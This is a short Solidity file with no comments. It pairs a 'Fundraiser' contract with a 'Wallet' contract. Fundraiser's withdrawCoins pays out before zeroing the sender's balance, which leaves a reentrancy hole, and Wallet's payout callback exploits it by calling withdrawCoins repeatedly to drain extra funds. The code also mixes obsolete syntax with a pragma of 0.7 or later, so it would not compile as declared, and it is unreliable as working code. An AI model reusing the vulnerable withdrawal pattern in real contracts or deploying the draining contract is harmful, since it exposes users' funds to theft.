// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Fundraiser {
    mapping(address => uint) balances;

    function withdrawCoins() {
        uint withdrawAmount = balances[msg.sender];
        Wallet wallet = Wallet(msg.sender);
        wallet.payout.value(withdrawAmount)();
        balances[msg.sender] = 0;
    }

    function getBalance() view returns (uint) {
        return address(this).balance;
    }

    function contribute() payable {
        balances[msg.sender] += msg.value;
    }

    function() payable {}
}

contract Wallet {
    Fundraiser fundraiser;
    uint numberOfIterations = 20;

    function Wallet(address fundraiserAddress) {
        fundraiser = Fundraiser(fundraiserAddress);
    }

    function contribute(uint amount) {
        fundraiser.contribute.value(amount)();
    }

    function withdraw() {
        fundraiser.withdrawCoins();
    }

    function getBalance() view returns (uint) {
        return address(this).balance;
    }

    function payout() payable {
        if (numberOfIterations > 0) {
            numberOfIterations--;
            fundraiser.withdrawCoins();
        }
    }

    function() payable {}
}
